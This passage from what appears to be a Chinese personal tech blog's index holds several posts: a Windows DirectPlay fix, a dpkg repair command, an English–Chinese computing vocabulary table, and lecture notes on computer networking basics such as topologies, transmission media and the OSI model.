    <url>/%E8%A7%A3%E5%86%B3cencrack%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E5%8C%85%E7%9A%84Direct%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>开启此功能即可正常运行:</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/directplay.png" /></p>
]]></content>
      <categories>
        <category>windows工具</category>
      </categories>
  </entry>
  <entry>
    <title>解决dpkg --configure -a 无法修复软件包关系的问题</title>
    <url>/%E8%A7%A3%E5%86%B3dpkg-configure-a-%E6%97%A0%E6%B3%95%E4%BF%AE%E5%A4%8D%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%85%B3%E7%B3%BB%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p><strong>执行</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/updates/*</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
如果提示有锁,则重启电脑,再次执行上述语句 <span id="more"></span></p>
]]></content>
      <categories>
        <category>answer&amp;question</category>
      </categories>
  </entry>
  <entry>
    <title>计算机常用英语词汇</title>
    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B8%B8%E7%94%A8%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87/</url>
    <content><![CDATA[<h2
id="这里大多数都是计算机英语如果想了解计算机科学力荐-crash-course-computer-science">这里大多数都是计算机英语,如果想了解计算机科学,力荐
<a href="https://www.bilibili.com/video/av21376839">Crash Course
Computer Science</a></h2>
<span id="more"></span>
<h3 id="单词表">单词表</h3>
<h4 id="常规单词">常规单词:</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">英文</th>
<th style="text-align: center;">汉译</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">modulation</td>
<td style="text-align: center;">调制</td>
</tr>
<tr class="even">
<td style="text-align: center;">detail</td>
<td style="text-align: center;">详情</td>
</tr>
<tr class="odd">
<td style="text-align: center;">explain</td>
<td style="text-align: center;">说明</td>
</tr>
<tr class="even">
<td style="text-align: center;">competition</td>
<td style="text-align: center;">竞争/竞赛</td>
</tr>
<tr class="odd">
<td style="text-align: center;">recursion</td>
<td style="text-align: center;">递归</td>
</tr>
<tr class="even">
<td style="text-align: center;">force</td>
<td style="text-align: center;">强制</td>
</tr>
<tr class="odd">
<td style="text-align: center;">grep</td>
<td style="text-align: center;">查找字符串/正则表达式</td>
</tr>
<tr class="even">
<td style="text-align: center;">file</td>
<td style="text-align: center;">文件</td>
</tr>
<tr class="odd">
<td style="text-align: center;">create</td>
<td style="text-align: center;">创建</td>
</tr>
<tr class="even">
<td style="text-align: center;">complement</td>
<td style="text-align: center;">反选/补充</td>
</tr>
<tr class="odd">
<td style="text-align: center;">permission</td>
<td style="text-align: center;">权限/许可</td>
</tr>
<tr class="even">
<td style="text-align: center;">ethernet</td>
<td style="text-align: center;">以太网</td>
</tr>
<tr class="odd">
<td style="text-align: center;">token</td>
<td style="text-align: center;">令牌</td>
</tr>
<tr class="even">
<td style="text-align: center;">hub</td>
<td style="text-align: center;">集线器</td>
</tr>
<tr class="odd">
<td style="text-align: center;">diode</td>
<td style="text-align: center;">二极管</td>
</tr>
<tr class="even">
<td style="text-align: center;">triode</td>
<td style="text-align: center;">电子三极管</td>
</tr>
<tr class="odd">
<td style="text-align: center;">transistor</td>
<td style="text-align: center;">晶体三极管</td>
</tr>
<tr class="even">
<td style="text-align: center;">emitting</td>
<td style="text-align: center;">发光</td>
</tr>
<tr class="odd">
<td style="text-align: center;">access</td>
<td style="text-align: center;">访问</td>
</tr>
<tr class="even">
<td style="text-align: center;">reverse</td>
<td style="text-align: center;">方向</td>
</tr>
<tr class="odd">
<td style="text-align: center;">destination</td>
<td style="text-align: center;">目标</td>
</tr>
<tr class="even">
<td style="text-align: center;">entry</td>
<td style="text-align: center;">条目</td>
</tr>
<tr class="odd">
<td style="text-align: center;">synchronize</td>
<td style="text-align: center;">同步</td>
</tr>
<tr class="even">
<td style="text-align: center;">received</td>
<td style="text-align: center;">接收</td>
</tr>
<tr class="odd">
<td style="text-align: center;">sent</td>
<td style="text-align: center;">发送</td>
</tr>
<tr class="even">
<td style="text-align: center;">established</td>
<td style="text-align: center;">已确立的</td>
</tr>
<tr class="odd">
<td style="text-align: center;">persistent</td>
<td style="text-align: center;">持续的</td>
</tr>
<tr class="even">
<td style="text-align: center;">daemon</td>
<td style="text-align: center;">守护进程</td>
</tr>
<tr class="odd">
<td style="text-align: center;">arch</td>
<td style="text-align: center;">架构</td>
</tr>
<tr class="even">
<td style="text-align: center;">filed</td>
<td style="text-align: center;">字段</td>
</tr>
<tr class="odd">
<td style="text-align: center;">assembly</td>
<td style="text-align: center;">汇编</td>
</tr>
<tr class="even">
<td style="text-align: center;">bias</td>
<td style="text-align: center;">偏置</td>
</tr>
<tr class="odd">
<td style="text-align: center;">weights</td>
<td style="text-align: center;">权重</td>
</tr>
<tr class="even">
<td style="text-align: center;">Authentication</td>
<td style="text-align: center;">认证</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Authorization</td>
<td style="text-align: center;">授权</td>
</tr>
<tr class="even">
<td style="text-align: center;">Audition</td>
<td style="text-align: center;">审核</td>
</tr>
</tbody>
</table>
<h4 id="词组">词组:</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">英文</th>
<th style="text-align: center;">汉译</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1-Wire bus</td>
<td style="text-align: center;">单总线</td>
</tr>
<tr class="even">
<td style="text-align: center;">Serial Periperal Interface</td>
<td style="text-align: center;">串行外设接口</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Inter Interface Circuit</td>
<td style="text-align: center;">芯片间总线</td>
</tr>
<tr class="even">
<td style="text-align: center;">routing table</td>
<td style="text-align: center;">路由表</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Activation value</td>
<td style="text-align: center;">激活值</td>
</tr>
<tr class="even">
<td style="text-align: center;">Basic band</td>
<td style="text-align: center;">基带</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Header Check Sum</td>
<td style="text-align: center;">首部校验和</td>
</tr>
</tbody>
</table>
<h4 id="简写全拼对照表">简写全拼对照表</h4>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">简写</th>
<th style="text-align: center;">全拼</th>
<th style="text-align: center;">汉译</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">FSK</td>
<td style="text-align: center;">Frequency-shift keying</td>
<td style="text-align: center;">频移键控</td>
</tr>
<tr class="even">
<td style="text-align: center;">ASK</td>
<td style="text-align: center;">Amplitude Shift Keying</td>
<td style="text-align: center;">幅移键控</td>
</tr>
<tr class="odd">
<td style="text-align: center;">PSK</td>
<td style="text-align: center;">Phase Shift Keying</td>
<td style="text-align: center;">相移键控</td>
</tr>
<tr class="even">
<td style="text-align: center;">PCM</td>
<td style="text-align: center;">Pulse Code Modulation</td>
<td style="text-align: center;">脉冲编码调制</td>
</tr>
<tr class="odd">
<td style="text-align: center;">VHDL</td>
<td style="text-align: center;">Very-High-Speed Integrated
CircuiHardwareDescription Language</td>
<td style="text-align: center;">超高速硬件描述语言</td>
</tr>
<tr class="even">
<td style="text-align: center;">CLK</td>
<td style="text-align: center;">clock</td>
<td style="text-align: center;">时钟</td>
</tr>
<tr class="odd">
<td style="text-align: center;">MAC</td>
<td style="text-align: center;">Media Access Control</td>
<td style="text-align: center;">设备访问控制</td>
</tr>
<tr class="even">
<td style="text-align: center;">CSMA/CD</td>
<td style="text-align: center;">Carrier Sense Multiple Access /
Collision Detection</td>
<td
style="text-align: center;">带冲突检测的载波监听多路访问技术(载波监听多点接入/碰撞检测)</td>
</tr>
<tr class="odd">
<td style="text-align: center;">BIOS</td>
<td style="text-align: center;">Basic Input/Output System</td>
<td style="text-align: center;">基本输入输出系统</td>
</tr>
<tr class="even">
<td style="text-align: center;">ARP</td>
<td style="text-align: center;">Address Resolution Protocol</td>
<td style="text-align: center;">地址解析协议</td>
</tr>
<tr class="odd">
<td style="text-align: center;">RARP</td>
<td style="text-align: center;">Reverse Address Resolution Protocol</td>
<td style="text-align: center;">反向地址转换协议</td>
</tr>
<tr class="even">
<td style="text-align: center;">LED</td>
<td style="text-align: center;">Light-emitting diode</td>
<td style="text-align: center;">发光二极管</td>
</tr>
<tr class="odd">
<td style="text-align: center;">FET</td>
<td style="text-align: center;">Field-Effect Transistor</td>
<td style="text-align: center;">场效应管</td>
</tr>
<tr class="even">
<td style="text-align: center;">MOS/MOSFET</td>
<td style="text-align: center;">Metal-Oxide-Semiconductor Field-Effect
Transistor</td>
<td
style="text-align: center;">金属-氧化物半导体场效应晶体管/金氧半场效晶体管/绝缘栅场效应管</td>
</tr>
<tr class="odd">
<td style="text-align: center;">OSI</td>
<td style="text-align: center;">Open System Interconnection</td>
<td style="text-align: center;">开放式互联</td>
</tr>
<tr class="even">
<td style="text-align: center;"></td>
<td style="text-align: center;"></td>
<td style="text-align: center;"></td>
</tr>
<tr class="odd">
<td style="text-align: center;">TTL</td>
<td style="text-align: center;">Time To Live</td>
<td style="text-align: center;">存活时间</td>
</tr>
<tr class="even">
<td style="text-align: center;">MTU</td>
<td style="text-align: center;">Maximum Transmission Unit</td>
<td style="text-align: center;">最大传输单元</td>
</tr>
<tr class="odd">
<td style="text-align: center;">TCP</td>
<td style="text-align: center;">Transmission Control Protocol</td>
<td style="text-align: center;">传输控制协议</td>
</tr>
<tr class="even">
<td style="text-align: center;">UDP</td>
<td style="text-align: center;">User Datagram Protocol</td>
<td style="text-align: center;">用户数据报协议</td>
</tr>
<tr class="odd">
<td style="text-align: center;">DHCP</td>
<td style="text-align: center;">Dynamic Host Configuration Protocol</td>
<td style="text-align: center;">动态主机设置协议</td>
</tr>
<tr class="even">
<td style="text-align: center;">DNS</td>
<td style="text-align: center;">Domain Name System</td>
<td style="text-align: center;">域名系统</td>
</tr>
<tr class="odd">
<td style="text-align: center;">HTTP</td>
<td style="text-align: center;">HyperText Transfer Protocol</td>
<td style="text-align: center;">超文本传输协议</td>
</tr>
<tr class="even">
<td style="text-align: center;">SQL</td>
<td style="text-align: center;">Structured Query Language</td>
<td style="text-align: center;">结构化查询语言</td>
</tr>
<tr class="odd">
<td style="text-align: center;">ACK</td>
<td style="text-align: center;">Acknowledge character</td>
<td style="text-align: center;">确认字符</td>
</tr>
<tr class="even">
<td style="text-align: center;">FIN</td>
<td style="text-align: center;">Finall</td>
<td style="text-align: center;">最终</td>
</tr>
<tr class="odd">
<td style="text-align: center;">RST</td>
<td style="text-align: center;">Reset</td>
<td style="text-align: center;">重置</td>
</tr>
<tr class="even">
<td style="text-align: center;">lo</td>
<td style="text-align: center;">loop back</td>
<td style="text-align: center;">回环</td>
</tr>
<tr class="odd">
<td style="text-align: center;">bcast</td>
<td style="text-align: center;">broadcast address</td>
<td style="text-align: center;">广播地址</td>
</tr>
<tr class="even">
<td style="text-align: center;">promisc</td>
<td style="text-align: center;">promiscuous mode</td>
<td style="text-align: center;">混杂模式</td>
</tr>
<tr class="odd">
<td style="text-align: center;">MBR</td>
<td style="text-align: center;">Master Boot Record</td>
<td style="text-align: center;">主引导记录</td>
</tr>
<tr class="even">
<td style="text-align: center;">ARK</td>
<td style="text-align: center;">AntiRootKit</td>
<td style="text-align: center;">Rookit检测</td>
</tr>
<tr class="odd">
<td style="text-align: center;">LVM</td>
<td style="text-align: center;">Logical Volume Manage</td>
<td style="text-align: center;">虚拟卷管理</td>
</tr>
<tr class="even">
<td style="text-align: center;">VFS</td>
<td style="text-align: center;">Virtual File System</td>
<td style="text-align: center;">虚拟文件系统</td>
</tr>
<tr class="odd">
<td style="text-align: center;">RC</td>
<td style="text-align: center;">Release Candidate</td>
<td style="text-align: center;">发布候选版本</td>
</tr>
<tr class="even">
<td style="text-align: center;">GRUB</td>
<td style="text-align: center;">GRand Unified Bootloader</td>
<td style="text-align: center;">引导加载程序</td>
</tr>
<tr class="odd">
<td style="text-align: center;">RPM</td>
<td style="text-align: center;">Redhat Package Manager/RPM is Package
Manager</td>
<td style="text-align: center;">Redhat/SUSE软件包管理器</td>
</tr>
<tr class="even">
<td style="text-align: center;">YUM</td>
<td style="text-align: center;">Yellodog Update Modifier</td>
<td style="text-align: center;">Centos/Redhat软件包依赖关系管理器</td>
</tr>
<tr class="odd">
<td style="text-align: center;">XML</td>
<td style="text-align: center;">eXtended Mark Language</td>
<td style="text-align: center;">拓展标记语言</td>
</tr>
<tr class="even">
<td style="text-align: center;">pts</td>
<td style="text-align: center;">pseudo-terminal slave</td>
<td style="text-align: center;">伪终端</td>
</tr>
<tr class="odd">
<td style="text-align: center;">tty</td>
<td style="text-align: center;">Teletypes</td>
<td style="text-align: center;">打字机/终端</td>
</tr>
<tr class="even">
<td style="text-align: center;">I</td>
<td style="text-align: center;">current Intensity</td>
<td style="text-align: center;">电流强度</td>
</tr>
<tr class="odd">
<td style="text-align: center;">V</td>
<td style="text-align: center;">Voltage</td>
<td style="text-align: center;">电压</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>计算机英语</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络第一节课笔记</title>
    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0.pdf" title="计算机网络第一节课笔记pdf文档下载">计算机网络第一节课笔记pdf文档下载</a>
<span id="more"></span>
<h1 id="计算机网络第一节课">计算机网络第一节课</h1>
<h3 id="网络分类">网络分类</h3>
<ul>
<li>从逻辑上看,计算机网络分为资源子网和通信子网</li>
</ul>
<h3 id="互联网起源">互联网起源</h3>
<ul>
<li>美国的阿帕网(ARPANET)</li>
</ul>
<h3 id="中国发出的第一封电子邮件">中国发出的第一封电子邮件</h3>
<ul>
<li>时间：1987年9月14日21时07分</li>
<li>地点：北京计算机应用技术研究所-&gt;德国卡尔斯鲁厄大学</li>
<li>人物：吴为民、王运丰</li>
<li>内容：越过长城，走向世界。Across the Great Wall we can reach every
corner in the world.</li>
</ul>
<h3 id="中国管理互联网资源的机构">中国管理互联网资源的机构</h3>
<ul>
<li>中国互联网络信息中心</li>
</ul>
<h3 id="拓扑结构">拓扑结构</h3>
<h4
id="总线拓扑-主机挂接在总线上互相直接通达">总线拓扑-主机挂接在总线上，互相直接通达</h4>
<ul>
<li>主线发出的信号在总线上双向传输</li>
<li>所有主机都可以接收到此信号</li>
</ul>
<h4
id="星形拓扑-主机挂接在一个中心节点上">星形拓扑-主机挂接在一个中心节点上</h4>
<ul>
<li>早期的中心节点由集线器充当</li>
<li>现在的中心节点由交换机充当</li>
</ul>
<h4 id="环形结构">环形结构</h4>
<h4 id="树形结构">树形结构</h4>
<h4 id="网状结构">网状结构</h4>
<h3 id="协议">协议</h3>
<h4
id="是一种规范规定了网络设备之间如何交换数据互相理解">是一种规范，规定了网络设备之间如何交换数据，互相理解</h4>
<h3 id="带宽">带宽</h3>
<h4 id="数字带宽">数字带宽</h4>
<ul>
<li>数字带宽是指在一个固定的时间内可传输的最大比特数据的量</li>
<li>基本单位比特每秒【bit/s】：bps</li>
</ul>
<h4 id="常见单位">常见单位</h4>
<ul>
<li>Kbps</li>
<li>Mbps</li>
<li>Gbps</li>
<li>Tbps 通常说的带宽是理想数字带宽</li>
</ul>
<h4 id="吞吐率是实际带宽">吞吐率是实际带宽</h4>
<ul>
<li>吞吐率是指在固定时间内成功传输的比特数据的量</li>
<li>吞吐率受很多条件影响，计算机性能，传输介质等</li>
</ul>
<h3 id="下载时间计算">下载时间计算</h3>
<p>S代表信息量 T代表下载时间</p>
<h4 id="理想型">理想型</h4>
<ul>
<li><span class="math inline">\(T=\frac{S}{BW}\)</span> BW代表带宽</li>
</ul>
<h4 id="现实型">现实型</h4>
<ul>
<li><span class="math inline">\(T=\frac{S}{P}\)</span> P代表吞吐量</li>
</ul>
<h3 id="网络连接方式">网络连接方式</h3>
<h4 id="点到点">点到点</h4>
<ul>
<li>计算机直接相连</li>
<li>计算机和交换机相连</li>
<li>电脑到通信局的电脑相连</li>
</ul>
<h4 id="端到端">端到端</h4>
<ul>
<li>虚连接，由一个一个点到点连接构成，类似链</li>
</ul>
<h3 id="计算机网络的分类">计算机网络的分类</h3>
<h4 id="按传输介质">按传输介质</h4>
<ul>
<li>有线网络</li>
<li>无线网络</li>
</ul>
<h4 id="按覆盖范围划分">按覆盖范围划分</h4>
<ul>
<li>PAN（Personal Area Network） 个域网 1米左右</li>
<li>LAN（Local Area Network） 局域网 1公里左右</li>
<li>MAN （Mertopolian Area Network）城域网 10公里左右</li>
<li>WAN （Wide Area Network）广域网 100-1000公里</li>
<li>Internet 互联网 全球</li>
</ul>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络第三节课笔记-物理层</title>
    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[
<span id="more"></span>
<p>#物理层</p>
<h2 id="传输介质">传输介质</h2>
<h3 id="分类">分类</h3>
<h4 id="导引性-有线">导引性-有线</h4>
<ul>
<li>铜线</li>
<li>光缆</li>
</ul>
<h4 id="非导引性-无限">非导引性-无限</h4>
<ul>
<li>无线电</li>
<li>卫星</li>
</ul>
<h3 id="有线">有线</h3>
<h4 id="同轴电缆">同轴电缆</h4>
<ul>
<li>基带同轴电缆
<ul>
<li>50Ω，用于数字传输（屏蔽层为铜）</li>
</ul></li>
<li>宽带同轴电缆
<ul>
<li>75Ω，用于模拟传输（）屏蔽层为铝</li>
</ul></li>
<li>粗缆
<ul>
<li>最大传输距离500m，两端安装终接器，确保电缆屏蔽层接地</li>
</ul></li>
<li>细缆
<ul>
<li>最大传输距离为185m，两头按住概念<strong>BNC</strong><a href="#fn1"
class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>头，接在<strong>T型连接器</strong><a
href="#fn2" class="footnote-ref" id="fnref2"
role="doc-noteref"><sup>2</sup></a>两端</li>
</ul></li>
</ul>
<h4 id="双绞线">双绞线</h4>
<ul>
<li><p>逆时针方向绞合而成</p>
<ul>
<li>用于消除近端串扰 Crosstalk<a href="#fn3" class="footnote-ref"
id="fnref3" role="doc-noteref"><sup>3</sup></a></li>
<li>绞距越小，越均匀，抵消效果越好，传输性能越好（高类网线和低类网线一个重要区别就是绞距不同<a
href="#fn4" class="footnote-ref" id="fnref4"
role="doc-noteref"><sup>4</sup></a>）</li>
</ul></li>
<li><p>非屏蔽双绞线-UTP</p>
<ul>
<li>优点</li>
<li>成本低
<ul>
<li>易于安装</li>
<li>尺寸低</li>
</ul></li>
<li>缺点
<ul>
<li>易受干扰</li>
<li>距离性能受到绞距影响</li>
</ul></li>
<li>五类双绞线
<ul>
<li>提供10-100M的数字带宽，其中两对线分别用于收、发</li>
<li>1000M以太网中，用到了全部的四对线</li>
<li>最大传输距离100m，广泛用于局域网</li>
</ul></li>
</ul></li>
<li><p>屏蔽双绞线-STP</p>
<ul>
<li>优点
<ul>
<li>抗<strong>EMI</strong><a href="#fn5" class="footnote-ref"
id="fnref5" role="doc-noteref"><sup>5</sup></a>、<strong>RFI</strong><a
href="#fn6" class="footnote-ref" id="fnref6"
role="doc-noteref"><sup>6</sup></a>干扰</li>
</ul></li>
</ul></li>
<li><p>缺点 - 成本高</p>
<ul>
<li>不易安装</li>
</ul></li>
<li><p>加了两层屏蔽层，用于每对线和全部四对线外</p></li>
<li><p>网屏双绞线-ScTP</p>
<ul>
<li>每个线对的屏蔽层去掉</li>
</ul></li>
<li><p>线序</p>
<ul>
<li>直通线
<ul>
<li>不同设备</li>
</ul></li>
<li>交叉线
<ul>
<li>同种设备</li>
</ul></li>
</ul></li>
</ul>
<p>电力线</p>
<ul>
<li>没有普及，未来技术</li>
</ul>
<h4 id="光纤">光纤</h4>
<ul>
<li>构成
<ul>
<li>光导纤维</li>
<li>玻璃覆盖层</li>
<li>外层</li>
</ul></li>
<li>原理
<ul>
<li>光的全反射
<ul>
<li>当光从光密物质射向光疏物质，入射角大于临界角，光发生全反射</li>
<li>光全锁闭在光密物质中，全反射钱箱</li>
</ul></li>
</ul></li>
<li>优点
<ul>
<li>重量轻
<ul>
<li>非常细的光导纤维</li>
</ul></li>
<li>损耗低</li>
<li>不受电磁干扰影响</li>
<li>带宽、容量大</li>
</ul></li>
<li>缺点
<ul>
<li>昂贵</li>
<li>易断裂</li>
</ul></li>
<li>分类
<ul>
<li>单模光纤</li>
<li>多模光纤</li>
</ul></li>
<li>光传输系统构成
<ul>
<li>光源</li>
<li>传输介质</li>
<li>探测器</li>
</ul></li>
<li>修复
<ul>
<li>光纤连接器</li>
<li>机械拼接，直接使用套管夹紧 10%损耗</li>
<li>熔合 无损耗</li>
</ul></li>
</ul>
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li
id="fn1"><p>BNC接头是监控工程中用于摄像设备输出时导线和摄像机的连接头。<a
href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn2"><p>一个同轴结构的端处分成三个方向，外形成“T”形的高频的连接器。<a
href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li
id="fn3"><p>串扰在电子学上是指两条信号线之间的耦合现象。这是因为空间距离近的信号线之间会出现不希望的电感性和电容性耦合从而互相干扰。电容性耦合会引发耦合电流，而电感性耦合则引发耦合电压<a
href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4"><p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/超五类线和六类线.png" /><a
href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5"><p>电磁干扰：Electromagnetic
Interference-电磁干扰是指电子产品工作会对周边的其他电子产品造成干扰<a
href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6"><p>射频干扰： Radio Frequency
Interference-射频干扰是在接收机所接收的信号频率或非常接近此频率处产生的干扰<a
href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络第二节课笔记-计算机网络模型</title>
    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[
<span id="more"></span>
<h1 id="计算机网络模型">计算机网络模型</h1>
<h2 id="osi七层模型">OSI七层模型</h2>
<h3 id="open-system-inerconnection-开放性系统互联">Open System
Inerconnection 开放性系统互联</h3>
<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">OSI七层模型</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">7. Application
<strong>应用层</strong>：软件交流协议</td>
</tr>
<tr class="even">
<td style="text-align: center;">6. Presentation
<strong>表示层</strong>：对数据的压缩解压缩，加密解密，把比特信息转换为一定格式的数据流</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5. Session
<strong>会话层</strong>：会话的建立，连接，拆除</td>
</tr>
<tr class="even">
<td style="text-align: center;">4. Transport
<strong>传输层</strong>：核心层之一，负责端到端连接，例如负责TCP的可靠性传输</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3. Network
<strong>网络层</strong>：核心层之一，最优路径<a href="#fn1"
class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>，从源主机送达至目标机，以ip地址<a
href="#fn2" class="footnote-ref" id="fnref2"
role="doc-noteref"><sup>2</sup></a>作为主机标识</td>
</tr>
<tr class="even">
<td style="text-align: center;">2. Data Link
<strong>数据链路层:提供介质访问服务</strong>。通过MAC<a href="#fn3"
class="footnote-ref" id="fnref3"
role="doc-noteref"><sup>3</sup></a>提供可靠的帧传递。提供差错控制、流控等</td>
</tr>
<tr class="odd">
<td style="text-align: center;">1. Physical
物理层：提供透明的比特流，任何可以表示两种状态的信号都可以。只管传输，不关心内容</td>
</tr>
</tbody>
</table>
<ul>
<li>七层模型每一层都完成特定功能，都为其上一层服务，每一层都使用下一层提供的服务【第一层和第七层除外】</li>
</ul>
<h2 id="dod模型">DOD模型</h2>
<h3 id="department-of-defense-model-美国国防部模型">Department of
Defense Model 美国国防部模型</h3>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">TCP/IP四层模型</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">4. Application <strong>应用层</strong><a
href="#fn4" class="footnote-ref" id="fnref4"
role="doc-noteref"><sup>4</sup></a></td>
</tr>
<tr class="even">
<td style="text-align: center;">3. Transport <strong>传输层</strong><a
href="#fn5" class="footnote-ref" id="fnref5"
role="doc-noteref"><sup>5</sup></a></td>
</tr>
<tr class="odd">
<td style="text-align: center;">2. Internet <strong>网络层</strong><a
href="#fn6" class="footnote-ref" id="fnref6"
role="doc-noteref"><sup>6</sup></a></td>
</tr>
<tr class="even">
<td style="text-align: center;">1. Network Access
<strong>物理层</strong><a href="#fn7" class="footnote-ref" id="fnref7"
role="doc-noteref"><sup>7</sup></a></td>
</tr>
</tbody>
</table>
<h2 id="osi模型和tcpip模型的不同">OSI模型和TCP/IP模型的不同</h2>
<ul>
<li>TCP/IP更简洁；OSI更易开发，更容易排除故障</li>
<li>TCP/IP是在实践中产生的，OSI只是一种理论模型</li>
</ul>
<h2 id="osi没有流行的原因">OSI没有流行的原因</h2>
<ul>
<li>糟糕的时机
<ul>
<li>TCP/IP已经流行</li>
<li>参杂了太多政策考量</li>
<li>庞大，笨拙</li>
</ul></li>
</ul>
<h2 id="数据传输">数据传输</h2>
<h3 id="发方工作">发方工作</h3>
<ol type="1">
<li>封装打包，由高到低，逐级打包</li>
<li>每一层上，加上头部信息
<ol type="1">
<li>OSI上三层，信息被表示为一定格式的数据流
<strong>DataStream</strong></li>
<li>数据流到达传输层，会被切割为方便传输的数据段
<strong>Segment</strong>，并加上段头，标明序列号，端口号等信息</li>
<li>数据段传到网络层，添加分组头成型分组
(<strong>Packet</strong>)分组头部中包含了寻址主机的IP和其他一些信息</li>
<li>分组传到数据链路层，添加帧头，帧头包含物理地址，校验和</li>
<li>帧到了物理层，被转换为比特流，被传送</li>
<li><a
href="https://blog.csdn.net/mincheat/article/details/61192701">MAC、IP头、TCP头、UDP头帧格式、详解</a></li>
</ol></li>
</ol>
<h3 id="收方工作">收方工作</h3>
<ul>
<li>逐层去掉头部，获取报文内部信息</li>
</ul>
<h3
id="关于协议数据单元不同层也有好多种说法">关于协议数据单元，不同层也有好多种说法</h3>
<ol type="1">
<li>应用层的PDU<a href="#fn8" class="footnote-ref" id="fnref8"
role="doc-noteref"><sup>8</sup></a>叫数据流或者报文</li>
<li>运输层（也叫传输层）PDU叫报文段，数据段，用户数据报</li>
<li>网络层的是分组、包、IP数据报、数据报</li>
<li>数据链路层的是帧</li>
<li>物理层的是比特流</li>
</ol>
<h3
id="协议作用于对应层之间层与层之间有接口接口用于服务的调用">协议作用于对应层之间，层与层之间有接口，接口用于服务的调用</h3>
<h3
id="任何一次通信都是由发方的封装开始接收方的解封装结束">任何一次通信，都是由发方的封装开始，接收方的解封装结束</h3>
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li id="fn1"><p>最优路径就是路由最短路径<a href="#fnref1"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2"><p>IP(<strong>Internet
Protorol</strong>)地址，用于标识/寻找主机<a href="#fnref2"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3"><p>MAC（<strong>Media Access Control
Address</strong>）地址也称为<strong>局域网地址</strong>（LAN
Address），<strong>MAC位址</strong>，<strong>以太网地址</strong>（Ethernet
Address）或<strong>物理地址</strong>。不做修改的情况下，一般是唯一的。MAC地址用于在网络中唯一标示一个网卡，一台设备若有一或多个网卡，则每个网卡都需要并会有一个唯一的MAC地址。一个网卡亦可以虚拟出多个虚拟网卡，每个虚拟网卡都会有各自的MAC地址和ip地址<a
href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4"><p>等同于OSI模型中的5-7层<a href="#fnref4"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5"><p>等同于OSI模型中的4层<a href="#fnref5"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6"><p>等同于OSI模型中的3层<a href="#fnref6"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn7"><p>等同于OSI模型中的1-2层<a href="#fnref7"
